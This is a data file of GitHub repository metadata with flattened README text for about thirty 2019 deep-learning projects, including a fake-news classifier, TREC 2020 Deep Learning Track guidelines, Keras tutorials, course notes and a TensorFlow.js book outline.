hanseokOh,fake_news_detection_DeepLearningBased,n/a,Fake News Detection DeepLearning Based Model This repo is a secondary repo for fakenewsTNASC https github com jucho2725 fakenewsdetectionTNASC Specially focused on Deep Learning based model LSTM based CNN based and Transformer based model Pre requisite Python 3 6 8 Pytorch 1 3 1 glove 6B 300 dimension embedding https nlp stanford edu projects glove index table about glove embedding preprocessed data use proper padding according to model Usage Preparation Format Tokenization and padding Train python train py h usage train py h model MODEL datapath DATAPATH weightsmatrix WEIGHTSMATRIX savedir SAVEDIR batchsize BATCHSIZE nepochs NEPOCHS hiddensize HIDDENSIZE numlayers NUMLAYERS nclass NCLASS learning rate LEARNING RATE valevery VALEVERY or you can check details on train py file we don t provide object BiLSTM weightsmatrix840B300 npy in progress change datapath parser and insert options for other models e g CNN Tranformer def defineargparser NOTE We assume that the dataset is not separated parser argparse ArgumentParser description run argparser parser addargument model required False default bi lstm help select model parser addargument datapath required False default help fake news data path csv format must include text type columns parser addargument weightsmatrix required False default object BiLSTM weightsmatrix840B300 npy help weights matrix path for word embeddings parser addargument savedir required True help where to save model checkpoint parser addargument batchsize type int default 64 parser addargument nepochs type int default 10 parser addargument hiddensize type int default 100 parser addargument numlayers type int default 3 parser addargument nclass type int default 1 help We only implement binary classification case Multiclass will be updated soon parser addargument learning rate type float required False default 1e 5 parser addargument valevery type int default 1 args parser parseargs return args Inference python classify py h usage classify py h model MODEL weightsmatrix WEIGHTSMATRIX modelpath MODELPATH sentpadpath SENTPADPATH labelpath LABELPATH datapath DATAPATH or you can check details on classify py file we don t provide weightsmatrix6B300 npy bestmodel pt sentpadmodified npy labelmodified pkl files def defineargparser argparse parser argparse ArgumentParser description run argparser parser addargument model required False default bi lstm help select model parser addargument weightsmatrix required False default data weightsmatrix6B300 npy help weights matrix path for word embeddings parser addargument modelpath required False default data bestmodel pt help model checkpoint path parser addargument sentpadpath required False default data sentpadmodified npy help padded sentence preprocessed parser addargument labelpath default data labelmodified pkl parser addargument datapath required False default help fake news data path csv format must include text type columns args parser parseargs return args,2019-10-24T04:00:05Z,2019-11-28T14:46:04Z,Python,hanseokOh,User,1,1,1,11,master,hanseokOh#jucho2725,2,0,0,0,0,0,4
cintia-shinoda,mba-IA-Deep_Learning_-_Reinforcement_Learning,n/a,mba IA DeepLearning Reinforcement Learning FIAP MBA IA Deep Learning amp Reinforcement Learning Turma 06IA Aula 01 23 10 2019 Aula 02 28 10 2019 Aula 03 04 11 2019 Aula 04 11 11 2019 Aula 05 25 11 2019 Aula 06 27 11 2019 Turma 10IA 2020,2019-10-30T01:55:15Z,2019-11-25T04:17:36Z,n/a,cintia-shinoda,User,1,1,0,2,master,cintia-shinoda,1,0,0,0,0,0,0
masa26hiro,deep-learning-with-keras,n/a,1tesaobiwamin10 26 3 13 2rsk91311 9 3 33 4masa26hiro11 23 4 14 4biwamin12 7 4 5tesao12 21 5 15 3masa26hiro1 11 5 45 5tesao1 25 6 16 3rsk9132 8 6 46 5biwamin2 22 6 66 9masa26hiro3 7 7 17 3tesao3 21 7 47 7rsk9134 4 8 1biwamin4 18 8 28 4masa26hiro5 2 markdown,2019-10-13T11:54:50Z,2019-11-23T03:29:30Z,Jupyter Notebook,masa26hiro,User,4,1,0,12,master,masa26hiro#biwamin#rsk913#tessai9,4,0,0,0,0,0,2
liuzuoping,Deep_Learning_note,n/a,DeepLearningnote tensorflowkeraspytorch,2019-10-02T05:15:20Z,2019-12-09T12:55:28Z,Jupyter Notebook,liuzuoping,User,1,1,0,5,master,liuzuoping,1,0,0,0,0,0,0
christosgkaris,Deep_Learning_Keras_Classification,n/a,,2019-10-28T20:34:26Z,2019-10-28T20:35:43Z,Python,christosgkaris,User,1,1,0,1,master,christosgkaris,1,0,0,0,0,0,0
lakithasahan,Tensorflow_Keras_deep_learning,n/a,TensorflowKerasdeeplearning In this example we use Keras deep learning library to classify famous IRIS data set You can download the complete code with data set from download section Keras is a high level neural networks API written in Python and capable of running on top of TensorFlow CNTK or Theano It was developed with a focus on enabling fast experimentation Being able to go from idea to result with the least possible delay is key to doing good research Use Keras if you need a deep learning library that 1 Allows for easy and fast prototyping through user friendliness modularity and extensibility 2 Supports both convolutional networks and recurrent networks as well as combinations of the two 3 Runs seamlessly on CPU and GPU Keras Cheat sheet which will be extreamly useful when creating classification models keras https user images githubusercontent com 24733068 65365540 8b617500 dc5d 11e9 9765 e8548b50646f jpeg python model Sequential first input layer with first hidden layer in a single statement model add Dense 100 inputshape 4 activation relu 100 is the size no of neurons of first hidden layer 4 is the no of features in the input layer inputshape 4 can also be written as inputdim 4 2nd hidden layer with 50 neurons model add Dense 50 activation relu ouput layer model add Dense 3 activation softmax 3 no of neurons in output layer as three categories of labels are there compile method receives three arguments an optimizer a loss function and a list of metrics model compile Adam lr 0 04 categoricalcrossentropy accuracy we use binarycrossentropy for binary classification problems and categoricalcrossentropy for multiclass classification problems the compile statement can also be written as model compile optimizer Adam lr 0 04 loss categoricalcrossentropy metrics accuracy we can give more than one metrics like accuracy mae mape model summary model fit trainX trainy epochs 100 ypred model predict testX model evaluate testX testy predicty ypred argmax axis 1 print predicty testyprob testy argmax axis 1 print testyprob print Accuracy accuracyscore testyprob predicty print micro precision precisionscore testyprob predicty average micro print macro recall recallscore testyprob predicty average macro print micro recall recallscore testyprob predicty average micro print testX print testX 0 colormap np array f50000 f58800 0b599f popa mpatches Patch color f50000 label Setosa popb mpatches Patch color f58800 label Versicolor popc mpatches Patch color 0b599f label Virginica plt subplot 2 1 1 plt scatter testX 0 testX 1 c colormap predicty cmap Paired plt title Keras NN Model predicted target output plt subplot 2 1 2 plt scatter testX 0 testX 1 c colormap testyprob cmap Paired plt title Actual target output plt tightlayout plt legend handles popa popb popc plt show OUTPUT plot can be found below Precition and Recall 1 0 keraspredict https user images githubusercontent com 24733068 65365630 5570c080 dc5e 11e9 908b 0dc198429924 png,2019-09-21T00:41:29Z,2019-09-21T01:03:48Z,Python,lakithasahan,User,1,1,0,8,master,lakithasahan,1,0,0,0,0,0,0
riven314,deep-learning-local-navigation,n/a,About This is a deep learning based local navigation system for the visually impaired users The system is prototyped in Python and it offers 3 special features 1 A segmentation module with low latency around 20 FPS and reliable segmentation performance 2 A scene understanding module for summarising spatial scene into grid of objects 3 An Obstacle avoidance module for detection of closest obstacle Hardware Specification To produce the statistics reported here we use a notebook with the following specification NVIDIA RTX 2070 Max Q 8GB Core i7 9750H CPU 230W AC Charger We use Intel Realsense D435i Camera https www intelrealsense com depth camera d435i as our depth camera Reproducing This Repo For hardware you need a Realsense camera and a notebook with discrete GPU For Realsense camera we recommend using Realsense Camera D400 Series https www mouser com new intel intel realsense camera 400 Our repo mainly use the following libraries Intel RealSense SDK 2 0 https github com IntelRealSense librealsense pyrealsense PyTorch 1 2 0 opencv 3 4 2 PyQt5 numpy matplotlib Pipeline Diagram The pipeline of our system can be summarized by the diagram below It broken down into the following steps 1 Our system seamlessly receives RGB image and its depth image We interfaces with D435i camera with pyrealsense2 2 After image proprocessing we feed the RGB image into segmentation module The segmentation module is developed in PyTorch 3 Our interface consolidate the above output and feed them to scene understanding module and obstacle avoidance module Additionally the obstacle avoidance module requires depth image as input Our interface developed in PyQt5 Pipeline results pipeline JPG Segmentation Module Our segmentation module is based on semantic segmentation pytorch https github com CSAILVision semantic segmentation pytorch While the base model is fast enough we made a number of modifications on the image preprocessing and postprocessing step to make the speed faster The original model consists 150 classes To smoothen the segmentation result we group them into 8 general classes The figure below illustrates the effectiveness of class grouping First top to bottom Original Images Segmentation before Class Grouping after Class Grouping segmentationcompare results segmentcompare jpg Scene Understanding Module To better help the visually blind user make sense of a scene this module aims to translate and condense the visual information encoded in segmentation result It divides the segmentation result into 6 equal grids and summarise the objects present for each grid To remove noise objects with little occupation in a grid are omitted Left Illustrating how segmentation result are divided Right Summary for each grid sceneunderstanding results scenesummary jpg Obstacle Avoidance Module This module informs the users if they are facing any close obstacles A red light is on if any close obstacle is detected Otherwise green light is on First Figure No close obstacle detected by the module Second Figure Close obstacle detected with its class and distance objavoid results woobj jpg objavoid results wobj jpg Demonstration The demo shows the fast frame rate and the segmentation stability of our system It also shows how our obstacle avoidance module works When any close obstacle is right close to the user red light is on with the corresponding obstacle visualized Short demo video for our system Corridor Experiment To show case the real time capacity of our system we also conducted an experiment in a narrow corridor located in Run Run Shaw Building The University of Hong Kong In the experiment one of our teammates role played the blind and navigated in the corridor by solely relying on our system Video can be found here https drive google com file d 1XXBcXv kllpN9k63bk1p5M5xWrsTEt2k view usp sharing A snapshot of our corridor experiment the full demo can be found on Google Drive https drive google com file d 1XXBcXv kllpN9k63bk1p5M5xWrsTEt2k view usp sharing longdemo results fulldemosnapshot JPG Acknowledgement This is my capstone project for my Master of Data Science degree in The University of Hong Kong The project is jointly developed by Alex Lau Guo Huimin and Xie Jun We would like to take this chance to thank our two supervisors Professor Yin Guoshen for his generous support and Dr Luo Ping for his guidance on segmentation modules Our segmentation module is mainly built on semantic segmentation pytorch https github com CSAILVision semantic segmentation pytorch The work gives us a very strong baseline to make our system solid Remarks Any contribution is welcome For enquiry you can contact Alex Lau alexlauwh gmail com alexlauwh gmail com for details,2019-10-20T07:27:36Z,2019-12-11T06:10:00Z,Python,riven314,User,1,1,0,84,master,riven314,1,0,0,0,0,0,0
14youlim,Deep-Learning-from-scratch,n/a,,2019-09-30T07:16:46Z,2019-10-10T02:31:59Z,Python,14youlim,User,1,1,0,6,master,14youlim,1,0,0,0,0,0,0
meton-robean,WriteDeepLearningFramework,n/a,WriteDeepLearningFramework learning Deep Learning Framework in depth and Trying to write a tiny DL framework,2019-09-24T13:36:20Z,2019-10-14T15:10:40Z,C,meton-robean,User,1,1,0,2,master,dsad94#meton-robean,2,0,0,0,0,0,0
tanddoubleu,Deep-learning-ML,n/a,,2019-10-29T15:58:13Z,2019-12-14T06:52:39Z,Jupyter Notebook,tanddoubleu,User,0,1,0,16,master,tanddoubleu,1,0,0,0,0,0,0
microsoft,TREC-2020-Deep-Learning,n/a,TREC 2020 Deep Learning Track Guidelines Timetable August Submissions close for document ranking task November TREC conference Introduction The Deep Learning Track studies information retrieval in a large training data regime This is the case where the number of training queries with at least one positive label is at least in the tens of thousands if not hundreds of thousands or more This corresponds to real world scenarios such as training based on click logs and training based on labels from shallow pools such as the pooling in the TREC Million Query Track or the evaluation of search engines based on early precision Our main goal is to study what methods work best in this regime For example do the same methods that work on small data also work on large data How much do methods improve when given more training data What external data and weak supervision can be brought in to bear in this scenario and how useful is it to combine full supervision with other forms of supervision including transfer learning Certain machine learning based methods such as methods based on deep learning are known to require very large datasets for training Lack of such large scale datasets has been a limitation for developing such methods for common information retrieval tasks such as document ranking One of the goals of the track is to make such large scale datasets publicly available which could enable the development of different machine learning architectures without being constrained by the amount of training data Through the evaluation methodologies we release as part of the track we also enable participants to compare the performance of their methods with other state of the art methods Deep Learning Track Tasks The deep learning track has two tasks Passage ranking and document ranking You can submit up to three runs for each of these tasks Both tasks use a large human generated set of training labels from the MS MARCO http msmarco org dataset The two tasks use the same test queries They also use the same form of training data with usually one positive training document passage per training query In the case of passage ranking there is a direct human label that says the passage can be used to answer the query whereas for training the document ranking task we transfer the same passage level labels to document level labels Below the two tasks are described in more detail Document Ranking Task The first task focuses on document ranking We have two subtasks related to this Full ranking and top 100 re ranking In the full ranking retrieval subtask you are expected to rank documents based on their relevance to the question where documents can be retrieved from the full document collection provided You can submit up to 1000 documents for this task It models a scenario where you are building an end to end retrieval system In the re ranking subtask we provide you with an initial ranking of 100 documents from a simple IR system and you are expected to re rank the documents in terms of their relevance to the question This is a very common real world scenario since many end to end systems are implemented as retrieval followed by top k re ranking The re ranking subtask allows participants to focus on re ranking only without needing to implement an end to end system It also makes those re ranking runs more comparable because they all start from the same set of 100 candidates Use of external information You are allowed to use external information while developing your runs When you submit your runs please fill in a form listing what evidence you used for example an external corpus such as Wikipedia or a pre trained model e g word embeddings When submitting runs participants will be able to indicate what resources they used This could include the provided set of document ranking training data but also optionally other data such as the passage ranking task labels or external labels or pretrained models This will allow us to analyze the runs and break they down into types IMPORTANT NOTE It is prohibited to use evidence from the MS MARCO Question Answering task in your submission That dataset reveals some minor details of how the MS MARCO dataset was constructed that would not be available in a real world search engine hence should be avoided Datasets This year we have a document ranking dataset Document ranking dataset The document ranking dataset is based on source documents which contained passages in the passage task Although we have an incomplete set of documents that was gathered some time later than the passage data the corpus is 3 2 million documents and our training set has 367 013 queries For each training query we map from a positive passage ID to the corresponding document ID in our 3 2 million We do so on the assumption that a document that produced a relevant passage is usually a relevant document Type Filename File size Num Records Format Corpus msmarco docs tsv https msmarco blob core windows net msmarcoranking msmarco docs tsv gz 22 GB 3 213 835 tsv docid url title body Corpus msmarco docs trec https msmarco blob core windows net msmarcoranking msmarco docs trec gz 22 GB 3 213 835 TREC DOC format same content as msmarco docs tsv Corpus msmarco docs lookup tsv https msmarco blob core windows net msmarcoranking msmarco docs lookup tsv gz 101 MB 3 213 835 tsv docid offsettrec offsettsv Train msmarco doctrain queries tsv https msmarco blob core windows net msmarcoranking msmarco doctrain queries tsv gz 15 MB 367 013 tsv qid query Train msmarco doctrain top100 https msmarco blob core windows net msmarcoranking msmarco doctrain top100 gz 1 8 GB 36 701 116 TREC submission qid Q0 docid rank score runstring Train msmarco doctrain qrels tsv https msmarco blob core windows net msmarcoranking msmarco doctrain qrels tsv gz 7 6 MB 384 597 TREC qrels format Train msmarco doctriples py https github com microsoft TREC 2019 Deep Learning blob master utils msmarco doctriples py Python script generates training triples Dev msmarco docdev queries tsv https msmarco blob core windows net msmarcoranking msmarco docdev queries tsv gz 216 KB 5 193 tsv qid query Dev msmarco docdev top100 https msmarco blob core windows net msmarcoranking msmarco docdev top100 gz 27 MB 519 300 TREC submission qid Q0 docid rank score runstring Dev msmarco docdev qrels tsv https msmarco blob core windows net msmarcoranking msmarco docdev qrels tsv gz 112 KB 5 478 TREC qrels format Submission evaluation and judging We will be following a similar format as the ones used by most TREC submissions which is repeated below White space is used to separate columns The width of the columns in the format is not important but it is important to have exactly six columns per line with at least one space between the columns text 1 Q0 pid1 1 2 73 runid1 1 Q0 pid2 1 2 71 runid1 1 Q0 pid3 1 2 61 runid1 1 Q0 pid4 1 2 05 runid1 1 Q0 pid5 1 1 89 runid1 where the first column is the topic query number the second column is currently unused and should always be Q0 the third column is the official identifier of the retrieved passage in context of passage ranking task and the identifier of the retrieved document in context of document ranking task the fourth column is the rank the passage document is retrieved the fifth column shows the score integer or floating point that generated the ranking This score must be in descending non increasing order The sixth column is the ID of the run you are submitting As the official evaluation set we provide a set of 200 queries msmarco test2019 queries tsv where 50 or more will be judged by NIST assessors For this purpose NIST will be using depth pooling and construct separate pools for the passage ranking and document ranking tasks Passages documents in these pools will then be labelled by NIST assessors using multi graded judgments allowing us to measure NDCG The same 200 queries are used for passage retrieval and document retrieval Besides our main evaluation using the NIST labels and NDCG we also have sparse labels for the 200 queries which already exist as part of the MS Marco dataset More information regarding how these sparse labels were obtained can be found at This allows us to calculate a secondary metric Mean Reciprocal Rank MRR The main type of TREC submission is automatic which means there was not manual intervention in running the test queries This means you should not adjust your runs rewrite the query retrain your model or make any other sorts of manual adjustments after you see the test queries The ideal case is that you only look at the test queries to check that they ran properly i e no bugs then you submit your automatic runs However if you want to have a human in the loop for your run or do anything else that uses the test queries to adjust your model or ranking you can mark your run as manual Manual runs are interesting and we may learn a lot but these are distinct from our main scenario which is a system that responds to unseen queries automatically Coordinators Nick Craswell Microsoft Bhaskar Mitra Microsoft Emine Yilmaz UCL and Daniel Campos Microsoft Dataset files Size on disk and md5sum Since these are large files to download here are the size in bytes and md5sum as a reference Filename Bytes md5sum msmarco docdev qrels tsv gz 40 960 2e00fe62ebfc29eb7ed219ba15f788c9 msmarco docdev queries tsv gz 94 208 ac20593d71b9c32ab2633230f9cdf10d msmarco docdev top100 gz 5 705 728 ac10255edf321821b0ccd0f123037780 msmarco docs trec gz 8 501 800 960 d4863e4f342982b51b9a8fc668b2d0c0 msmarco docs tsv gz 8 446 275 584 103b19e21ad324d8a5f1ab562425c0b4 msmarco docs lookup tsv gz 40 378 368 abe791080058a3d3161b213cfea36a45 msmarco doctrain qrels tsv gz 2 387 968 e2b108a4f79ae1be3f97c356baff2ea0 msmarco doctrain queries tsv gz 6 459 392 4086d31a9cf2d7b69c4932609058111d msmarco doctrain top100 gz 403 566 592 be32fa12eb71e93014c84775d7465976 Contributing This project welcomes contributions and suggestions Most contributions require you to agree to a Contributor License Agreement CLA declaring that you have the right to and actually do grant us the rights to use your contribution For details visit https cla opensource microsoft com When you submit a pull request a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately e g status check comment Simply follow the instructions provided by the bot You will only need to do this once across all repos using our CLA This project has adopted the Microsoft Open Source Code of Conduct https opensource microsoft com codeofconduct For more information see the Code of Conduct FAQ https opensource microsoft com codeofconduct faq or contact opencode microsoft com mailto opencode microsoft com with any additional questions or comments Legal Notices Microsoft and any contributors grant you a license to the Microsoft documentation and other content in this repository under the Creative Commons Attribution 4 0 International Public License https creativecommons org licenses by 4 0 legalcode see the LICENSE LICENSE file and grant you a license to any code in the repository under the MIT License https opensource org licenses MIT see the LICENSE CODE LICENSE CODE file Microsoft Windows Microsoft Azure and or other Microsoft products and services referenced in the documentation may be either trademarks or registered trademarks of Microsoft in the United States and or other countries The licenses for this project do not grant you rights to use any Microsoft names logos or trademarks Microsoft s general trademark guidelines can be found at http go microsoft com fwlink LinkID 254653 Privacy information can be found at https privacy microsoft com en us Microsoft and any contributors reserve all other rights whether under their respective copyrights patents or trademarks whether by implication estoppel or otherwise,2019-10-22T21:20:25Z,2019-10-24T23:10:21Z,n/a,microsoft,Organization,4,1,0,10,master,microsoftopensource#spacemanidol,2,0,0,0,0,0,1
neeveermoree,ida_deep_learning,n/a,HSE IDA Deep Learning Jupyter Notebooks for HSE IDA Deep Learning course 1 hw1 contains code for different optimization methods and variations of Gradient Descent 2 hw2 Speed comparison between NumPy and Tensorflow Tuning learning rate and momentum Tensorflow MLP trained on MNIST 3 hw3 Constructing CNN model based on CIFAR 10 dataset with 85 accuracy Model performance comparison using different weight initialization,2019-09-23T20:42:17Z,2019-11-10T18:08:24Z,Jupyter Notebook,neeveermoree,User,1,1,0,12,master,neeveermoree,1,0,0,0,0,0,0
erikapat,DEEP-LEARNING-EXAMPLES,n/a,DEEP LEARNING EXAMPLES,2019-10-18T08:38:42Z,2019-11-03T13:17:54Z,Jupyter Notebook,erikapat,User,1,1,0,11,master,erikapat,1,0,0,0,0,0,0
jsogarro,deep_learning_with_tensorflowjs,n/a,images cover png Deep Learning with TensorFlow js Train and deploy deep learning models in the browser using artificial neural networks Node and TensorFlow js Copyright Jamal Sinclair O Garro 2018 2020 Important Note About the Status of this Book This book is currently a work in progress I am writing it in the open to allow others to review and comment as I work to complete it I am a big believer in open source software so I think it makes sense for more books on software development computer science artificial intelligence and machine learning to be written in an open source manner Originally I was writing this book with a publisher however I decided to self publish it since I was simultaneously writing another book with a different publisher and did not have the time to complete both manuscripts within the time constraints I was given I think this is a good thing because both publishers had very aggressive deadlines both gave me less than six months to complete both books but this was a lesson for me to learn as a first time author Now that I can publish this book on my own terms and on my own timeline I can take the time to present the material in way that I think would benefit readers the most I plan to spend a couple of hours a week completing these chapters so note that they are very rough and are in their beginning stages However you should feel free to read them and provide feedback as you see fit by opening an issue on GitHub Contributions are also welcome The contribution instructions appear in CONTRIBUTING md CONTRIBUTING md I plan to credit every contributor that contributes to the book Table of Contents Acknowledgements About This Book About the Author Chapter 1 Introducing TensorFlow js Chapter 2 Installation and Environment Setup Chapter 3 Modern JavaScript and Node js Chapter 4 Artificial Neural Networks Chapter 5 Your Very First Deep Learning Model Chapter 6 Understanding the TensorFlow js Core API Chapter 7 Understanding the TensforFlow js Layers API Chapter 8 Importing and Running Existing Models in the Browser Chapter 9 Deploying Deep Learning Models to the Browser Chapter 10 Next Steps in Deep learning Glossary Target audience This book is aimed at front end and full stack software developers that are interested in learning how to use TensorFlow js to embed machine learning and deep learning models in the browser Little to no experience with Artificial Intelligence Machine Learning or Deep Learning is required though some familiarity with JavaScript and web technologies is recommended Long Description We currently live in an age where data is more abundant than ever before in human history This increase of data has caused a machine learning revolution that rendered ideas that were once limited by theory to be used in everyday applications The current saying is that data is the new oil and many companies have changed their business operations in such a way that they are built around gathering and learning from data This increase in interest for collecting more data has led to the rise of embedded machine learning algorithms in the applications that we use on a daily basis For example every time you check the ETA for directions in Google Maps or Uber a machine learning algorithm estimates how long it will take for you to arrive at your destination When you sign into Netflix and are recommended a movie to watch or when you are recommended similar products to purchase on Amazon its probably an artificial neural network coming up with suggestions behind the scenes To properly process the massive amounts of data that are currently being collected by todays tech enabled businesses a large amount of computing is required As a result the development deployment and inference done by machine learning models has traditionally been done on the server However this can prove to be expensive for models that must update themselves in real time when receiving feedback from the user since it may require a round trip to the server With Googles recent release of TensorFlow js we can build and deploy simple machine learning models in the browser or load existing models to use for inference and even retrain these models with new data directly in the browser In this book we will learn the basics of artificial neural networks and deep learning Specifically we will learn how to develop and deploy deep learning models in the browser leveraging the power of artificial neural networks In particular we will use Googles popular open source high performance numerical computation library TensorFlow js to add the power of machine learning algorithms to our front end applications What You Will Learn In this book readers will learn the fundamental building blocks of deep learning and how to use TensorFlow js to construct artificial neural networks to create machine learning and deep learning models Your journey will begin by learning about the history of TensorFlow js as well as the basics of deep learning and artificial neural networks We will then explore the TensorFlow js Core and Layers APIs and learn how they can be used to develop artificial neural networks and deep learning models You will then learn how to perform inference and retrain existing models in browser after receiving additional data from the end user Last well learn how to deploy the front end of an application containing embedded TensorFlow models to the Internet and how to optimize it for production use We will implement several fundamental deep learning models as we learn each of these topics Approach In this book we will learn just enough TensorFlow js to build and deploy deep learning models to the web Each chapter will focus on a section of the TensorFlow js API after completing a short primer on artificial intelligence and deep learning Readers will learn how to use both the Core and Layers APIs to develop deep learning models The chapters are presented in a tutorial style where each chapter builds off of what was learned in the previous chapter This book has been organized in such a way that each chapter can also serve as a quick reference for a particular topic Author Bio Jamal Sinclair OGarro is a full stack Node js and Python developer with experience working at several bulge bracket investment banks and asset management firms including Goldman Sachs and Morgan Stanley BlackRock Financial Management a multi billion dollar hedge fund and a major securities market maker His primary focus is designing and building electronic trading software systems Jamal has both written and deployed deep learning models that have been used in the systematic semi systematic and algorithmic trading programs Jamal is also heavily involved in the NYC tech scene and runs two of New York City s largest tech meetups He has been invited to and has spoken at the President Barrack Obama s White House the United Nations and New York University Jamal has been featured or quoted in media outlets such as Fortune Forbes TechCrunch and CNN Money In his spare time he likes to shoot photography learn new functional programming languages give tech talks and teach others how to code He has taught software engineering and web development courses at the New Jersey Institute of Technology and Columbia University in the City of New York Jamal currently lives in in the suburbs of New York City in beautiful Westchester County with his loving wife and soulmate Felicia,2019-10-03T10:37:46Z,2019-11-02T16:06:33Z,JavaScript,jsogarro,User,1,1,0,14,master,jsogarro#dependabot[bot],2,0,0,1,0,1,21
Sunysh,Genome-Deep-Learning,n/a,Genome Deep Learning,2019-09-27T06:41:53Z,2019-11-25T02:44:30Z,Python,Sunysh,User,1,1,0,3,master,Sunysh,1,0,0,0,0,0,0
saman-rahbar,deep_learning_with_pytorch,n/a,Deep Learning Practices and Concepts Using Pytorch Languages used Python 3 6 Libraries Used pandas numpy pytorch seaborn Make sure you have installed all the dependenicies and libraries compatible with python 3 6 to run the codes,2019-10-20T00:20:47Z,2019-10-27T21:45:38Z,Jupyter Notebook,saman-rahbar,User,1,1,0,26,master,saman-rahbar,1,0,0,0,0,0,0
tarasowski,hello-world-deep-learning,n/a,https machinelearningmastery com tutorial first neural network python keras,2019-10-30T11:45:59Z,2019-10-31T08:58:55Z,Python,tarasowski,User,0,1,0,2,master,tarasowski,1,0,0,0,0,0,0
kpatel4241,Deep-Learning-Mini-Projects,n/a,,2019-09-28T04:56:46Z,2019-10-31T16:07:24Z,Jupyter Notebook,kpatel4241,User,1,1,0,18,master,kpatel4241,1,0,0,0,0,0,0
kiselik,deep-learning-course,n/a,deep learning course Installation System requrements Python 3 6 python mnist package numpy package To simplify the obtaining dataset please use gettrainingdata script pip3 install python mnist numpy python3 gettrainingdata py Getting started neuralnetwork py implemented NeuralNetwork class and related functionality Run example python3 neuralnetwork py train images 10 0 05 0 01 100 Inputs folder with training data in gz format stop criterion by the number of eras stop criterion for minimizing cross entropy learning Speed the number of neurons in the hidden layer,2019-10-15T21:47:09Z,2019-11-01T13:15:01Z,Python,kiselik,User,1,1,1,4,master,kiselik,1,0,0,2,0,2,0
yelinyun123,deep-learning-image-caption,n/a,deep learning image caption A paper list of image caption 2019 ViLBERT Pretraining Task Agnostic Visiolinguistic Representations for Vision and Language Tasks pdf https arxiv org pdf 1908 02265v1 pdf code https github com jiasenlu vilbertbeta 2018 Bottom Up and Top Down Attention for Image Captioning and Visual Question Answering CVPR 2018 pdf https arxiv org pdf 1707 07998v3 pdf code https github com facebookresearch pythia 2017 2016 2015 Show Attend and Tell Neural Image Caption Generation with Visual Attention pdf https arxiv org pdf 1502 03044v3 pdf code https github com kelvinxu arctic captions Data sets paper Li X Lan W Dong J et al Adding Chinese captions to images C Proceedings of the 2016 ACM on International Conference on Multimedia Retrieval ACM 2016 271 275 Wu J Zheng H Zhao B et al AI challenger a large scale dataset for going deeper in image understanding J arXiv preprint arXiv 1711 06475 2017 Xirong Li Chaoxi Xu Xiaoxu Wang Weiyu Lan Zhengxiong Jia Gang Yang Jieping Xu COCO CN for Cross Lingual Image Tagging Captioning and Retrieval IEEE Transactions on Multimedia Volume 21 Number 9 pages 2347 2360 2019,2019-09-24T06:17:06Z,2019-11-07T14:31:09Z,n/a,yelinyun123,User,1,1,0,8,master,yelinyun123,1,0,0,0,0,0,0
ProfessorDong,Deep-Learning-Course-Examples,n/a,Deep Learning Course Examples Baylor University Department of Electrical and Computer Engineering Introduction to Deep Learning Course Examples in TensorFlow and Keras 1 Train a two layer neural network to approximate a 2D function FuncApproxNN py,2019-10-02T16:54:58Z,2019-11-14T22:32:39Z,Python,ProfessorDong,User,1,1,1,80,master,ProfessorDong,1,0,0,0,0,0,0
CarlosQuixada,Chatbot-Deep-Learning,n/a,,2019-10-14T21:17:37Z,2019-10-14T23:47:01Z,n/a,CarlosQuixada,User,1,1,0,1,master,CarlosQuixada,1,0,0,0,0,0,0
chaidisheng,deep-learning-optimizer,n/a,deep learning optimizer Mini Batch Gradient Descent Mini Batch gradient descent with momentum RMSprop Adam adaptive momentum estimation I introduce classic optimizer to classify mnist,2019-10-14T01:32:01Z,2019-12-01T03:07:55Z,Python,chaidisheng,User,1,1,0,4,master,chaidisheng,1,0,0,0,0,0,0
guyulongcs,Deep-Reinforcement-Learning-Materials,n/a,Deep Reinforcement Learning Materials Tutorials OpenAI https spinningup openai com en latest https lilianweng github io lil log 2018 02 19 a long peek into reinforcement learning html Lessons Learned https www alexirpan com 2018 02 14 rl hard html http amid fish reproducing deep rl https arxiv org abs 1709 06560 Courses Berkeley http rail eecs berkeley edu deeprlcourse videos https www youtube com watch v opaBjK4TfLc list PLkFD640KJIxJMR j5A1mkxK26ghqg37 index 25 Stanford http web stanford edu class cs234 index html UCL David Silver http www0 cs ucl ac uk staff d silver web Teaching html videos https www youtube com watch v 2pWv7GOvuf0 CMU Deep Reinforcement Learning and Control https katefvision github io Book Reinforcement Learning An Introduction book http incompleteideas net book RLbook2018 pdf code1 https github com dennybritz reinforcement learning code2 https github com ShangtongZhang reinforcement learning an introduction Codes OpenAI https github com openai spinningup git link https spinningup openai com en latest index html https github com openai baselines https github com carpedm20 deep rl tensorflow Nature 2015 Human level control through deep reinforcement learning code https github com devsisters DQN tensorflow git web site https sites google com a deepmind com dqn DRL that matters https git io vFHnf Morvan https morvanzhou github io tutorials machine learning reinforcement learning Library RLLib https github com ray project ray tree master python ray rllib TFRL https github com deepmind trfl Baseline https github com openai baselines RLLab https github com rll rllab Horizon https github com facebookresearch Horizon,2019-09-28T07:45:39Z,2019-09-28T08:16:53Z,n/a,guyulongcs,User,1,1,0,7,master,guyulongcs,1,0,0,0,0,0,0
eaglewarrior,Deep-Reinforcement-Learning,n/a,Deep Reinforcement Learning This repo contains all project I submitted for Deep Reinforcement Learning Nanodegree,2019-10-29T06:25:30Z,2019-11-16T14:11:53Z,Jupyter Notebook,eaglewarrior,User,1,1,0,5,master,eaglewarrior,1,0,0,0,0,0,0
rbr7,deep_learning_specialization_7,deep-learning#neural-networks#python,deeplearningspecialization7 Deep Learning specialisation coursera courses and projects Neural Networks and Deep learning Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization Convolutional neural networks,2019-09-24T04:46:44Z,2019-12-05T16:54:10Z,Jupyter Notebook,rbr7,User,1,1,0,9,master,rbr7,1,0,0,0,0,0,0
deepanshusadh,Deep-learning-perceptron,n/a,,2019-10-18T05:10:53Z,2019-10-25T05:23:47Z,Jupyter Notebook,deepanshusadh,User,1,1,0,1,master,deepanshusadh,1,0,0,0,0,0,0
yhskgo,pyspark_deep_learning,pysaprk#spark,,2019-10-08T08:27:08Z,2019-10-22T00:54:47Z,Jupyter Notebook,yhskgo,User,1,1,0,2,master,yhskgo,1,0,0,0,0,0,0
